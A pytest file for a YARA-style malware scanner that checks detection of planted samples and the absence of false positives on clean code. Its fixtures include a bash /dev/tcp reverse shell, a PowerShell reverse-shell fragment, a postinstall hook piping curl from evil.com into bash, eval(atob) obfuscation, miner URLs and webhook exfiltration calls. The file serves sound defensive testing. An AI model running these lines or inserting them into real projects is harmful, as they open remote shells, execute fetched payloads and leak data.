"""Tests for YARA scanner."""

from __future__ import annotations

from pathlib import Path


from cola_coder.security.yara_scanner import YaraScanner


class TestYaraScannerDetection:
    """Test YARA rule pattern detection."""

    def test_detects_crypto_miner(self, tmp_path: Path) -> None:
        f = tmp_path / "miner.js"
        f.write_text('const pool = "stratum+tcp://pool.minergate.com:3333";')
        scanner = YaraScanner()
        result = scanner.scan_file(f)
        assert not result.is_clean
        assert any("CryptoMiner" in t.name for t in result.threats)

    def test_detects_coinhive(self, tmp_path: Path) -> None:
        f = tmp_path / "coinhive.js"
        f.write_text('new CoinHive.Anonymous("key");')
        scanner = YaraScanner()
        result = scanner.scan_file(f)
        assert not result.is_clean

    def test_detects_reverse_shell_bash(self, tmp_path: Path) -> None:
        f = tmp_path / "shell.sh"
        f.write_text('bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
        scanner = YaraScanner()
        result = scanner.scan_file(f)
        assert not result.is_clean
        assert any("ReverseShell" in t.name for t in result.threats)

    def test_detects_powershell_reverse(self, tmp_path: Path) -> None:
        f = tmp_path / "rev.ps1"
        f.write_text('$client = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242)')
        scanner = YaraScanner()
        result = scanner.scan_file(f)
        assert not result.is_clean

    def test_detects_obfuscated_eval_atob(self, tmp_path: Path) -> None:
        f = tmp_path / "obf.js"
        f.write_text('eval(atob("Y29uc29sZS5sb2coImhlbGxvIik="))')
        scanner = YaraScanner()
        result = scanner.scan_file(f)
        assert not result.is_clean
        assert any("Obfuscated" in t.name for t in result.threats)

    def test_detects_postinstall_curl(self, tmp_path: Path) -> None:
        f = tmp_path / "package.json"
        f.write_text('{"scripts": {"postinstall": "curl http://evil.com/payload | bash"}}')
        scanner = YaraScanner()
        result = scanner.scan_file(f)
        assert not result.is_clean

    def test_detects_data_exfiltration(self, tmp_path: Path) -> None:
        f = tmp_path / "exfil.js"
        f.write_text('fetch("https://hooks.slack.com/services/T00/B00/xxxx", {body: data})')
        scanner = YaraScanner()
        result = scanner.scan_file(f)
        assert not result.is_clean

    def test_detects_telegram_bot(self, tmp_path: Path) -> None:
        f = tmp_path / "bot.py"
        f.write_text('requests.post("https://api.telegram.org/bot123456:ABC/sendMessage")')
        scanner = YaraScanner()
        result = scanner.scan_file(f)
        assert not result.is_clean


class TestYaraScannerCleanCode:
    """Verify clean code passes without false positives."""

    def test_normal_typescript(self, tmp_path: Path) -> None:
        f = tmp_path / "clean.ts"
        f.write_text("""
interface User { name: string; email: string; }
function greet(user: User): string {
    return `Hello, ${user.name}!`;
}
const users: User[] = [];
""")
        scanner = YaraScanner()
        result = scanner.scan_file(f)
        assert result.is_clean

    def test_normal_python(self, tmp_path: Path) -> None:
        f = tmp_path / "clean.py"
        f.write_text("""
import os
from pathlib import Path

def read_config(path: str) -> dict:
    with open(path) as f:
        return json.load(f)
""")
        scanner = YaraScanner()
        result = scanner.scan_file(f)
        assert result.is_clean

    def test_ignores_non_code_files(self, tmp_path: Path) -> None:
        f = tmp_path / "data.npy"
        f.write_bytes(b"stratum+tcp://evil" * 100)
        scanner = YaraScanner()
        result = scanner.scan_file(f)
        assert result.is_clean  # .npy not in code extensions

    def test_directory_scan(self, tmp_path: Path) -> None:
        (tmp_path / "clean.ts").write_text("const x: number = 1;")
        (tmp_path / "also_clean.py").write_text("x = 42")
        scanner = YaraScanner()
        result = scanner.scan_directory(tmp_path)
        assert result.is_clean
        assert result.files_scanned == 2

    def test_directory_with_threat(self, tmp_path: Path) -> None:
        (tmp_path / "clean.ts").write_text("const x = 1;")
        (tmp_path / "evil.js").write_text('eval(atob("Y29uc29sZS5sb2c="))')
        scanner = YaraScanner()
        result = scanner.scan_directory(tmp_path)
        assert not result.is_clean
        assert result.files_scanned == 2
        assert len(result.threats) >= 1

    def test_empty_directory(self, tmp_path: Path) -> None:
        scanner = YaraScanner()
        result = scanner.scan_directory(tmp_path)
        assert result.is_clean
        assert result.files_scanned == 0


class TestYaraScannerAvailability:
    def test_always_available(self) -> None:
        scanner = YaraScanner()
        assert scanner.is_available()

    def test_nonexistent_file(self, tmp_path: Path) -> None:
        scanner = YaraScanner()
        result = scanner.scan_file(tmp_path / "nonexistent.ts")
        assert result.is_clean
        assert result.files_scanned == 0
